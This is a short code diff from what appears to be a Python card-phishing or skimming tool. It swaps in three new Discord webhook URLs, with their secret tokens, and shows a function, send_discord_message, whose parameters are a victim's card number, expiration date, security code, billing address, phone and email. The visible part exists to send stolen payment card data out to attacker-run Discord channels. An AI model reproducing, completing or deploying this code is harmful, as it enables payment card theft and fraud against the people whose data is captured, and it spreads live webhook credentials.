@@ -19,9 +19,9 @@ from email.mime.multipart import MIMEMultipart
 
 # Discord Webhook URL
 DISCORD_WEBHOOK_URLS = [
-    "https://canary.discord.com/api/webhooks/1415244225678938223/nIzUBBcoG28z6F05cFADon8gBNM04gwbgU0e-UJE4ZJEo4DdYiK5mw4VW8Bm9zH-gzxX",
-    "https://canary.discord.com/api/webhooks/1415244318230183957/1dVhGXtqPmJKdYvKFNGY4YzRU9vg1ZmjeVZp5jMlWVDJx6egcQnpUIDGOk8w1I_LjAwZ",
-    "https://canary.discord.com/api/webhooks/1415244591212400833/iUy9XVE5VuX0oFVgYJnoaBRbcxkIZHoRV8sKLfgRgLCj_Rb6fJtQJGG3KKTG9Ml787kv"
+    "https://discord.com/api/webhooks/1419999335319474257/nO7A-1cze0nb1AypMg3fl9KqSrUCkyUXqbpDkaQdLmb2X9S-Oos_-9PDO4EkBlJrqh1F",
+    "https://discord.com/api/webhooks/1419999347634081833/gZX2_H361QImAW3SsQ0sqH6PCq2oKY_pGktvOwU3VGo6j89K9XVY9x95DhgABvcHSIxE",
+    "https://discord.com/api/webhooks/1419999359109562481/DwzKnCxp9SAJNvNkjTf9BkAfkQrWCOF6kk6PraMkBAczXKuRIWnskyqqCTK2GR-0q3vV"
 ]
 
 def send_discord_message(cardholder_name, card_number, expiration_date, security_code, billing_address, city, state, zip_code, country, phone_number, email, useragent):
